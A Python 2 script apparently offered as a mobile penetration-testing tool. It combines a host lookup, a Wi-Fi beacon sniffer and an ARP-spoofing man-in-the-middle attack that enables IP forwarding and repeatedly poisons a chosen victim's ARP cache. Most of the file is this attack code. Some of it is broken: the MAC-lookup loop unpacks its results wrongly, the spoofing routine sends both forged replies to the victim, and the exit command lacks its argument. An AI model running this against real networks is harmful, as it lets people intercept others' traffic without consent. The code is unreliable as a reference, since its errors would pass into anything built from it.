#!/usr/bin/env python
import os, commands, cmd, sys, json, socket, time
try:
    from scapy.all import *
except ImportError:
    print "You are missing scapy"

"""
Mobile pentest platform for android (can be used on Linux/Mac too)
Author: _r3c0n_
Name: onthego
Version: v.01
""" 
"""
Options:
1: Host Info (Domain Info)
2: Wifi Sniffer
3: MITM
4: exit
"""

print "============================================"
print " onTHEgo mobile pentest framework           "
print "============================================"
print "1. Host info (1 #url)\n2. Wifi Sniffer (2 #interface name)\n3. MITM Attack\n4. Exit"
class ONTHEGO(cmd.Cmd):
    prompt = 'oTg> '
    def do_1(self, line):
        info = socket.gethostbyname(line)
        print info
    def do_2(self, line):
        def PacketHandler(pkt):
            if pkt.type == 0 and pkt.subtype == 8:
                print " AP MAC: %s with SSID: %s " % (pkt.addr2, pkt.info)
        sniff(iface=line, prn = PacketHandler)
    def do_3(self, line):
        # MITM code written by: THE DEFALT
        # wonderhowto link: http://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
        try:
            interface = raw_input("[>] Interface to be used: ")
            victim = raw_input("[>] IP of Victim: ")
            gate = raw_input("[>] Router IP: ")
        except KeyboardInterrupt:
            print "\n[*] Shutting down"
            exit(1)
        print "\n[*] Port forwarding being enabled"
        commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
        def get_mac(IP):
            conf.verb = 0
            ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
            for snd.rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
        def reARP():
            print "\n[*] Restoring Targets..."
            victimMac = get_mac(victim)
            gateMac = get_mac(gate)
            send(ARP(op = 2, pdst = gate, psrc = victim, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 7)
            print "\n[*] Port Fowarding being disabled"
            commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print "[*] Shutting down"
            exit(1)
        def trick(gm, vm):
            send(ARP(op = 2, pdst = victim, psrc = gate, hwdst = vm))
            send(ARP(op = 2, pdst = victim, psrc = gate, hwdst = gm))
        # time for the MITM attack!
        def mitm():
            try:
                victimMAC = get_mac(victim)
            except Exception:
                print "[!] Failed to get victim MAC"
                print "Exiting"
                commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
                exit(1)
            try:
                gateMAC = get_mac(gate)
            except Exception:
                print "[!] Failed to get Router MAC"
                print "Exiting"
                commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
                exit(1)
            print "[*] Poising Targets"
            while(1):
                try:
                    trick(gateMAC, victimMAC)
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    reARP()
                    break
        mitm()
    def do_4(self):
        exit(1)

# shell loop
if __name__ == '__main__':
    ONTHEGO().cmdloop()
